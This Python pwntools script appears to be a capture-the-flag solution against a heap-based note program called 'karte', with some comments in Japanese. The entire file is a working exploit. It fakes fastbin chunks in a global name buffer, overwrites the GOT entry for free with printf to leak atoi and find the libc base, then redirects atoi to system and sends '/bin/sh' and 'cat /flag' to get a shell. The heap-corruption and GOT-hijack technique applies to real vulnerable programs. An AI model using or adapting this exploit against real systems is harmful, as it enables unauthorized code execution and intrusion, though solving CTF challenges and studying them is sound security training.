#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./karte"

rhp = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

main_addr = 0x40095b
name_addr = 0x6021a0
list_addr = name_addr-0x60
atoi_offset = 0x40680
system_offset = 0x4f440
gadget_7f = 0x602075

def add(conn,size,desc): #desc should include \n if you want new line
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("Input size > ")
  conn.sendline(str(size))
  conn.recvuntil("Input description > ")
  conn.send(desc)
  conn.recvuntil("Added id ")
  return int(conn.recvline()[:-1])

def delete(conn,_id):
  conn.recvuntil("> ")
  conn.sendline("3")
  conn.recvuntil("Input id > ")
  conn.sendline(str(_id))

def modify(conn,_id,desc):
  conn.recvuntil("> ")
  conn.sendline("4")
  conn.recvuntil("Input id > ")
  conn.sendline(str(_id))
  conn.recvuntil("Input new description > ")
  conn.send(desc)

def rename(conn,name):
  conn.recvuntil("> ")
  conn.sendline("99")
  conn.recvuntil("... ")
  conn.send(name)

def exploit(conn):
  #sizeの下1bitが1になってるのはPREVINUSEを立てるためだよ！！
  #(めんどくさい統合処理を避けるため)


  #max rename size == 0x40

  #username regisration
  conn.recvuntil("... ")
  # to bypass size check of malloc fastbin
  #             prevsize  size        fwd                 
  conn.sendline(p64(0) + p64(0x81) + p64(name_addr + 0x60))


  #consume tcache
  for i in range(8):
    id_temp = add(conn,0x60,"A")
    delete(conn,id_temp)
  for i in range(8):
    id_temp = add(conn,0x70,"B")
    delete(conn,id_temp)
 
  #on fastbins
  id1 = add(conn,0x70,"C")
  id2 = add(conn,0x70,"D")
  #delete
  delete(conn,id2)
  delete(conn,id1)

  
  #modify
  modify(conn,id1,p64(name_addr)[:4]) #make refer to name

  id1 = add(conn,0x78,p64(0)*13+p64(0x70)[:7])
  id2 = add(conn,0x78,p64(0x81)*2+p64(0x81)*11+p64(0x81)[:7])  
  id3 = add(conn,0x78,p64(0)*3+p64(0x21))
  #now
  #id1: 0x80 @ hoge
  #id2: 0x80 @ name
  #id3: 0x80 @ name+0x60 (0x60 has no meaning, just writable temporaly area)
  
  delete(conn,id2) #free name chunk
  id2 = add(conn,0x78,p64(0)*11+p64(0x21)+p64(0)+p64(0x11)) #0x11 has no meaning, just set the LSB of id3's size field, Idon't know why 0x21 is needed;what's field?
  #★ 1
  #           prevsize size
  rename(conn,p64(0)+p64(0x71)) #change size
  #now
  #id1: 0x80 @ hoge
  #id2: 0x70 @ name
  #id3: 0x80 @ name+0x60
  
  delete(conn,id2)
  delete(conn,id1)
  delete(conn,id3)  
  #now
  #(id1): 0x80 @ hoge
  #(id2): 0x70 @ name
  #(id3): 0x80 @ name+0x60
  
  rename(conn,p64(0)+p64(0x71)+p64(gadget_7f))
  #now
  #(id1): 0x80 @ hoge
  #(id2): 0x70 @ name -> 7f_gadget
  #(id3): 0x80 @ name+0x60
  
  id2 = add(conn,0x68,p64(0))
  id1 = add(conn,0x68,"ABC"+p32(0x0)+p64(0xdeadbeef)*0xa+p64(0)+p64(0x7f))
  #now
  #id1:   0x70 @ 7f_gadget (0@0x6020dc, 0x7f@0x6020e4)
  #id2:   0x70 @ name
  #(id3): 0x80 @ name+0x60

  #bypass zfd ★ 2
  delete(conn,id2) #list: null id1 null
  rename(conn,p64(0)+p64(0x71)+p64(0x6020dc))
  #now
  #id1:   0x70 @ 7f_gadget
  #(id2): 0x70 @ name -> 0x6020dc
  #(id3): 0x80 @ name+0x60
  
  id2 = add(conn,0x68,p64(0))
  id3 = add(conn,0x68,p64(0)*6+p8(0)*4 + p32(0x5) + p32(0x6) + p64(0)*2 + p64(0x7f) + p32(0x1) + p32(id2) + p64(name_addr+0x10) + p8(0)) #preserve first(id2's) buffer address and clear second' inuse flag 
  #now
  #id1: 0x70 @ 7f_gadget
  #id2: 0x70 @ name
  #id3: 0x70 @ 0x6020dc (0@list-0x10, 0x7f@list-0x8)

  delete(conn,id2) #list: null null(id1) id3
  rename(conn,p64(0)+p64(0x71)+p64(0x602130)+p64(0x71)) #set next next chunk to 0x602130: list-0x10
  #now
  #[id1]: 0x70 @ 7f_gadget
  #(id2): 0x70 @ name -> list-0x10
  #id3: 0x70 @ 0x6020dc (0@list-0x10, 0x7f@list-0x8)
  
  id2 = add(conn,0x68,p64(0))
  payload = p32(1)+p32(id2)+p64(binf.got["atoi"])
  payload += p64(0)+p64(0) #this field got overwritten soon due to the field of himself
  payload += p32(1)+p32(id3)+p64(binf.got["free"])
  payload += p64(0xdeadc0bebeef)
  id1 = add(conn,0x68,payload) #list - 0x10
  #now
  #id1: 0x70 @ list-0x10
  #id2: 0x70 @ name
  #id3: 0x70 @ 0x6020dc (0@list-0x10, 0x7f@list-0x8)

  #overwrite GOT of free and leak the address of atoi
  modify(conn,id3,p64(binf.plt["printf"])[:6])
  delete(conn,id2) #invoke printf(*atoi addr) 
  atoi_addr = unpack(conn.recvline()[:-1].ljust(8,'\0'))
  print("[**]atoi: "+hex(atoi_addr))
  libc_base = atoi_addr - atoi_offset
  print("[**]libc base: "+hex(libc_base))
  system_addr = libc_base + system_offset
  print("[**]system: "+hex(system_addr))

  #overwrite GOT of atoi and do system()
  modify(conn,id2,p64(system_addr)[:6]) #[:6] is because the length of input is the older one - 1
  conn.recvuntil("> ")
  conn.sendline("/bin/sh") #invoke system("/bin/sh") instead of atoi
  conn.sendline("cat /flag")
  

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

